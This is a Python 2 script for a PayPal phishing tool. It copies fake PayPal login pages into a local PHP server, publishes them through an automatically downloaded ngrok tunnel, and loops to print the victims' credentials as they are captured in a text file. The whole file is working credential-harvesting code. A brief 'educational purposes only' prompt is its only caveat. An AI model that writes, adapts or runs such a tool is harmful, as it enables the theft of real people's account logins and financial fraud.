#-*- coding: utf-8 -*-


from time import sleep
from sys import stdout, exit
from os import system, path
import multiprocessing
from urllib import urlopen
from platform import system as systemos, architecture
from wget import download

RED, WHITE, CYAN, GREEN, END = '\033[91m', '\33[46m', '\033[36m', '\033[1;32m', '\033[0m'

def connected(host='http://duckduckgo.com'):
    try:
        urlopen(host)
        return True
    except:
        return False
if connected() == False:
     print '''
         \  /            ____ ____ ____ _ ____ _       ____ ___ _   _
          \/             [__  |  | |    | |__| |       |___||__| \ /
          /\             ___] |__| |___ | |  | |___    |    |  |  |
         /  \.
                    {0}[{1}!{0}]{1} Network error. Check your connection.\n
'''.format(RED, END)
     exit(0)

def checkNgrok():
    if path.isfile('Server/ngrok') == False:
        print '[*] Downloading Ngrok...'
        ostype = systemos().lower()
        if architecture()[0] == '64bit':
            filename = 'ngrok-stable-{0}-amd64.zip'.format(ostype)
        else:
            filename = 'ngrok-stable-{0}-386.zip'.format(ostype)
        url = 'https://bin.equinox.io/c/4VmDzA7iaHb/' + filename
        download(url)
        system('unzip ' + filename)
        system('mv ngrok Server/ngrok')
        system('rm -Rf ' + filename)
        system('clear')
checkNgrok()

def end():
    system('clear')
    print '''
                    {0}S O C I A L{2}
                        $$                      {0}+++++++++++++++++++++++++{2}
                       $$ $$                    {0}+                       +{2}
                       $$                       {0}+  {3}for educational ONLY{2} {0}+{2}
                        $$                      {0}+      {3}Pipioli{2}          {0}+{2}
                         $$                     {0}+                       +{2}
                       $$ $$                    {0}+++++++++++++++++++++++++{2}
                         $$
                        {1}P A Y{2}

{3} DON'T FORGET THAT WHEN YOU PEE IN A DREAM YOU PEE IN REAL LIFE ! {2}


          '''.format(GREEN, END, CYAN, RED)

def loadModule(module):
       print '''

                          _____
                       ,-"     "-.
                      / o       o \.
                     /   \     /   \.
                    /     )-"-(     \.
                   /     ( 666 )     \.
                  /       \ " /       \.
                 /         )=(         \.
                /   o   .--"-"--.   o   \.
               /    I  /  -   -  \  I    \.
           .--(    (_)y/\       /\y(_)    )--.
          (    ".___l\/__\_____/__\/l___,"    )
           \                                 /
            "-._      o O o O o O o      _,-"
                `--Y--.___________.--Y--'
                   |==.___________.==|
                   `==.___________.=='

 [*] %s module charging. Building site...'''.format(CYAN, END) % module

def runPhishing(social):
    system('sudo rm -Rf Server/www/*.* && touch Server/www/cat.txt')
    if social == 'Paypal':
	system('cp WebPages/paypal/*.* Server/www/')

def waitCreds():
    print " {0}[{1}*{0}]{1} Waiting Credentials... \n".format(GREEN, END)
    while True:
        with open('Server/www/cat.txt') as creds:
            lines = creds.read().rstrip()
        if len(lines) != 0:
            print ' {0}[ Credentials Found ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines
            system('rm -rf Server/www/cat.txt && touch Server/www/cat.txt')
        creds.close()

def runPEnv():
    system('clear')
    print '''{1}
                            $$$$
                        $$$$$$$$$$$$
                        $$  $$$$  $$
                        $$  $$$$
                        $$  $$$$
  ███████ ████████ ███████$██$███████ ██       {0}███████ ███████ ██    ██{1}
  ██      ██    ██ ██      ██$██   ██ ██       {0}██    █ ██   ██  ██  ██{1}
  ███████ ██    ██ ██      ██$███████ ██       {0}███████ ███████    ██{1}
       ██ ██    ██ ██      ██$██$  ██ ██       {0}██      ██   ██    ██{1}
  ███████ ████████ ███████ ██$██  $██ ███████  {0}██      ██   ██    ██{1}
                            $$$$  $$
                            $$$$  $$
                            $$$$  $$
                        $$$$$$$$$$$$
                            $$$$                            {3}v1{2}

                        {0}
 {0}                     {0}
 {0}

                             {1}'''.format(GREEN, END, CYAN, RED)

    for i in range(101):
        sleep(0.01)
        stdout.write("\r{0}[{1}*{0}]{1} Preparing system... %d%%".format(CYAN, END) % i)
        stdout.flush()

    print "\n\n{0}[{1}*{0}]{1} Looking for PHP... ".format(CYAN, END)
    if 256 != system('which php'):
        print " --{0}>{1} OK.".format(CYAN, END)
    else:
	print " --{0}>{1} PHP NOT FOUND: \n {0}*{1} Please install PHP http://www.php.net/".format(RED, END)
        exit(0)
    if raw_input(" {0}[{1}!{0}]{1} Use this script for eductational purposes only (y/n)\n {2}SF > {1}".format(RED, END, CYAN)).upper() != 'Y':
        system('clear')
        print '\n[ {0}You cant use this script{1} ]\n'.format(RED, END)
        exit(0)
    option = raw_input("\nSelect an option:\n\n {0}[{1}1{0}]{1} Paypal\n\n{0}SF >  {1}".format(CYAN, END))
    if option == '1':
	       loadModule('Paypal')
	       runPhishing('Paypal')
    else:
        exit(0)

def runNgrok():
    system('./Server/ngrok http 80 > /dev/null &')
    sleep(10)
    system('curl -s -N http://127.0.0.1:4040/status | grep "https://[0-9a-z]*\.ngrok.io" -oh > ngrok.url')
    url = open('ngrok.url', 'r')
    print('\n {0}[{1}*{0}]{1} Ngrok URL: {2}' + url.read() + '{1}').format(CYAN, END, GREEN)
    url.close()

def runServer():
    system("cd Server/www/ && sudo php -S 127.0.0.1:80")

if __name__ == "__main__":
    try:
        runPEnv()
        runNgrok()
        multiprocessing.Process(target=runServer).start()
        waitCreds()
    except KeyboardInterrupt:
        system('pkill -f ngrok')
        end()
        exit(0)
